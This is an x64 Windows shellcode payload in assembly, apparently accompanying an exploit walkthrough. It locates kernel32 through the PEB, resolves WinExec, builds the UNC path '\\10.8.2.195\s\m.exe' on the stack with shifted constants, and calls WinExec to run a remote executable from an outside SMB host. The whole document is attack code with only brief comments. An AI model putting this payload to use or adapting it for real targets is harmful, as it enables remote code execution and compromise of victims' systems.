[bits 64]

; PLEASE NOTE: you cannot compile this and expect it to work for you
; I used a very specific method to compile this using the Keystone Framework
; see my walkthrough if you are interested

; DEBUG:  kernel32+68630 = KERNEL32!WinExec

locate_kernel32:
    xor rcx, rcx                    ; zero out rcx
    nop                             ;
    nop                             ;
    nop                             ;
    jmp 0x0f                        ;

    add rcx, 0x60                   ;
    nop                             ;
    nop                             ;
    jmp 0x17                        ; 

    mov rax, gs:[rcx]               ; rax = _PEB
    nop                             ;
    nop                             ;
    jmp 0x1f                        ; 

    mov rax, [rax + 0x18]           ; rax = _PEB->_PEB_LDR_DATA
    nop                             ;
    nop                             ;
    jmp 0x27                        ;

    mov  rsi, [rax + 0x20]          ; rsi = 
                                    ; _PEB->_PEB_LDR_DATA->InMemoryOrderModuleList
    nop                             ;
    nop                             ;
    jmp 0x2f                        ;

    lodsq                           ; rax = Second Module (NTDLL)
    xchg rax, rsi                   ; rax = rsi, rsi = rax
    lodsq                           ; rax = Third Module (KERNEL32)
    jmp 0x37                        ;

    mov r15, [rax + 0x20]           ; r15 = base address of kernel32
    nop                             ;
    nop                             ;
    jmp 0x3f                        ;

; r15 = base address of kernel32
resolve_winexec:
    mov ebx, 0x1280                 ; mov the offset of WinExec in to ebx
    nop                             ; 
    jmp 0x14                        ;

    add rbx, r15                    ; add kernel base to WinExec offset
    mov r14, rbx                    ; mov the address of WinExec in to r14
    jmp 0x1c                        ;

; r14 points to addr of winexec
; pushing '\\10.8.2.195\s\m.exe'
push_smb_addr_on_stack:
    xor rax, rax;
    nop;
    nop;
    nop;
    jmp 0x14                        ;

    or rax, 0x6578652e;
    jmp 0x1c                        ;

    push rax;
    nop;
    nop;
    nop;
    nop;
    nop;
    jmp 0x24;

    mov eax, 0x6d5c735c;
    nop;
    jmp 0x2c;

    shld rax, rax, 30;
    nop;
    jmp 0x34;

    shld rax, rax, 2;
    nop;
    jmp 0x3c;

    or rax, 0x3539312e;
    jmp 0x44;

    nop;
    push rax;
    nop;
    nop;
    nop;
    nop;
    jmp 0x4c;

    mov eax, 0x322e382e;
    nop;
    jmp 0x54;

_jump_change:
    shld rax, rax, 29;
    nop;
    jmp 0x17;

    shld rax, rax, 3;
    nop;
    jmp 0x1f;

    or rax, 0x30315c5c;
    jmp 0x27;

    nop;
    nop;
    push rax;
    nop;
    nop;
    nop;
    jmp 0x2f;

winexec_params:
    mov rcx, rsp                    ; move the smb name in to rcx - lpCmdLine
    nop;
    nop;
    nop;
    jmp 0x17;

    mov edx, 0x5;                   ; move 0x5 in to rdx - uCmdShow
    nop;
    jmp 0x1f;

align_stack:
    nop                             ;
    nop                             ;
    sub rsp, 0x38                   ; stack alignment
    jmp 0x17;

call_winexec:
    call r14                        ; call WinExec
    nop;
    nop;
    nop;
    jmp 0x1f;
